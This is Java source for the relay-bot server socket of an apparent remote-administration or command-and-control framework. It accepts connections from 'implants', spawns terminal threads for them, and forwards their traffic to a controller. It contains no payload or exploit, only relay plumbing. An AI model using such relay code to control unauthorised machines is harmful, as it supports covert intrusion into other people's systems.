package RelayBot;

/**
 * This is the main ServerSocket thread listening for new connections across the relay bot.  Each connection will be thrown into a new terminal thread
 * 
 * 
 * 
 * @author Solomon Sonya
 */




import java.io.*;
import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;

import javax.swing.*;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;

import java.awt.*;

public class RelayBot_ServerSocket extends Thread implements Runnable
{
	static String strMyClassName = "RelayBot_ServerSocket";
	
	public static int svrSocketPort = -1;
	static public InetAddress localhost = null;
	static public ServerSocket svrSocket = null;
	static public String serverAddr ="";
			
	
	static public boolean serverSocketRunning = false; 
			
	public static volatile boolean keepServerSocketOpen = true;
	
	public static String careOfAddress = " - ";
	
	public static volatile String strForwardAddressToController = "";
	public static int portToController = 0;
	
	public static boolean relay_bridge_enabled = false;
	public static boolean relay_proxy_enabled = false;
	
	public RelayBot_ServerSocket(boolean relayBridgeMode, boolean relayProxyMode, int serverSocketPort, String addressToCtrl, int portToCtrl)
	{
		try
		{
			relay_bridge_enabled = relayBridgeMode;
			relay_proxy_enabled = relayProxyMode;
			
			//set variables here			
			svrSocketPort = serverSocketPort;
			
			strForwardAddressToController = addressToCtrl;
			portToController = portToCtrl;
			
			Driver.alRandomUniqueImplantIDs = new ArrayList<Long>();//each terminal connected will be given a unique num!
			
			
		}
		catch(Exception e)
		{
			Driver.eop("RelayBot_ServerSocket Constructor", strMyClassName, e, "", false);
		}
		
	}
	
	public void run()
	{		
		//
		//ESTABLISH SERVER SOCKET
		//
		keepServerSocketOpen  = establishServerSocket(svrSocketPort);
				
		/*******************************************
		 * 
		 * INFINITE WHILE FOR NEW CONNECTIONS!
		 * 
		 ******************************************/
		while(keepServerSocketOpen)
		{
			Socket sckClientSocket = null;
			Thread_Terminal terminal = null;
			
			try
			{
				//forever wait until a new connection is established, once a new connection is received, spawn a new 
				sckClientSocket = svrSocket.accept();
				
				//new connection received, establish terminal_thread to interact with it
				terminal = new Thread_Terminal(false, false, true, sckClientSocket);
				terminal.relay_Controller_Forward_Address = strForwardAddressToController;
				terminal.relay_Controller_Forward_Port = portToController;
				terminal.myCareOfAddress = careOfAddress;
				terminal.relay_mode_BRIDGE = relay_bridge_enabled;
				terminal.relay_mode_PROXY = relay_proxy_enabled;
				terminal.myRelaybot_ServerSocket = this;
				terminal.start();											
				
				//"link" the thread to the arraylist
				Driver.alRelayTerminals.add(terminal);
												
				//update number connected agents
				updateConnectedImplants();	
				
				Drivers.sop("\n\nTHREAD STARTED AND LINKED!");
				
				//that is all, loop back to the top to wait to accept the next connection
			}
						
			
			catch(SocketException se)
			{
				Driver.sop("RelayBot ServerSocket is closed. I am terminaing waiting for connections.  Please re-establish ServerSocket if necessary");
				keepServerSocketOpen = false;
				break;
			}
			
			
			catch(Exception e)
			{
				Driver.eop("RelayBot_ServerSocket thead run", strMyClassName, e, "Not a problem. Perhaps remote agent disconnected. Please re-establish the server socket if necessary", false);
				//keepServerSocketOpen = false;
			}
			
			//We break out when the server socket is no longer running. indicate accordingly
			/*this.jlblEstablishedPortNum.setText("CLOSED");
			this.jlblServerIP.setText("OFFLINE");
			this.jlblStatusLabel.setText("OFFLINE");*/
		}
		
		Driver.sop("RelayBot is Terminating ServerSocket...");
	}
	
	/**
	 * If we have connected controllers, we need to inform all controllers that we have an updated registry of connected implant systems (and connected controllers)
	 * @return
	 */
	public static boolean updateConnectedImplants()
	{
		try
		{			
			//Driver.jop("Solo, in " + strMyClassName + " need to call this from end of Terminal when handahske is complete");
			
			//send the clear command, and then start over and update on all agents we have here
			
			DEPRECATED_RelayBot_ForwardConnectionThread controller = null;
			
			DEPRECATED_RelayBot_AgentConnectedToRelayBot implant = null;
			
			//need to send all connected implants to each controller in the system
			/*for(int i = 0; i < alControllerThreads.size(); i++)
			{
				controller = alControllerThreads.get(i);
				
				//FIRST, instruct forward controller (or next hop relay) to clear my current reported sockets because i will be updating the list on new sockets momentarily
				controller.sendToController_Or_Next_Relay(Driver.RELAY_CLEAR_RELAY_SOCKETS, false);
				
				for(int j = 0; j < alInitialConnectedSockets.size(); j++)
				{
					implant = alInitialConnectedSockets.get(j);
					
					controller.sendToController_Or_Next_Relay(Driver.RELAY_NEW_SOCKET + Driver.delimeter_1 + implant.getHandShakeRowData(), false);
				}
			}*/
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("updateConnectedImplants", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean establishServerSocket(int prt)
	{
		try
		{
			serverSocketRunning = false;
			keepServerSocketOpen = false;
			
			//Establish ServerSocket and bind to Port
			try
			{
				svrSocket = new ServerSocket(prt);
			}
			catch(SocketException se)
			{
				Driver.sop("Unable to bind to port " + prt + ". ServerSocket is Closed. You must try another port in order to continue");
				return false;
			}
			
			//Set the IP address
			localhost = InetAddress.getLocalHost();
			
		
			String success = 	" * * * * * ServerSocket Established at " +Driver.getTimeStamp_Without_Date() + " * * * * *\n" + 
								"Server HostName: " + localhost.getHostName() + "\n" + 
								"Server IP: " + localhost.getHostAddress() + "\n" + 
								"Listening for Implants on Port: " + prt;
			
			Driver.sop(success);
			
			careOfAddress = ""+localhost.getHostAddress();
			
			keepServerSocketOpen = true;			
						
			serverSocketRunning = true;
			
			/**
			 * solo, think of resolving external ip using the following code: //add button
			 * 
			 * URL myIP = new URL("http://checkip.amazonaws.com");
			 * BufferedReader brURL = new BufferedReader(new InputStreamReam(myIP.openStream()));
			 * String line = brURL.readLine();
			 * brURL.close(); 
			 * 
			 */
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("establishServerSocket", strMyClassName, e, "Unable to maintain established server socket", false);
		}
		
		return false;
	}
	
	public static boolean removeImplantThreadAgent(RelayBot_ForwardConnection threadToRemove)
	{
		try
		{			
			if(threadToRemove == null)
				return false;
			
			return  RelayBot_ServerSocket.removeImplantThread(threadToRemove, threadToRemove.getId());
		}
		catch(Exception e)
		{
			Driver.eop("removeImplantThreadAgent", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public static boolean removeImplantThread(RelayBot_ForwardConnection threadToRemove, long threadID_ToRemove)
	{
		try
		{
			if(Driver.alRelayTerminals == null || Driver.alRelayTerminals.size() < 1)
			{
				Driver.sop("alRelayTerminals - ArrayList is empty. No clients further to remove");
				return false;
			}
			
			//remove thread from Active Implant's list
			if(Driver.alRelayTerminals.contains(threadToRemove))
			{
				boolean success = Driver.alRelayTerminals.remove(threadToRemove);
				
				if(success)
				{
					Driver.sop("* Successfully removed thread id: " + threadToRemove);
					
					//try to close forward socket
					try
					{
						threadToRemove.sktConnection.close();
						Driver.sop("Forwardlink socket closed.");
					}catch(Exception e){}
					
					//try to close backward socket
					try
					{
						threadToRemove.parent.sktMyConnection.close();
						Driver.sop("Backlink socket closed.");
					}catch(Exception e){}
					
					try
					{
						threadToRemove.continueRun = false;
					}catch(Exception e){}
				}
			}
			
			//update connected agents
			updateConnectedImplants();
			
									
			return true;
		}
		catch(Exception e)
		{
			Driver.sop("Exception handled when removing thread id: " + threadID_ToRemove + " in " + strMyClassName);
		}		
		
		updateConnectedImplants();		
		return false;
	}
	
}
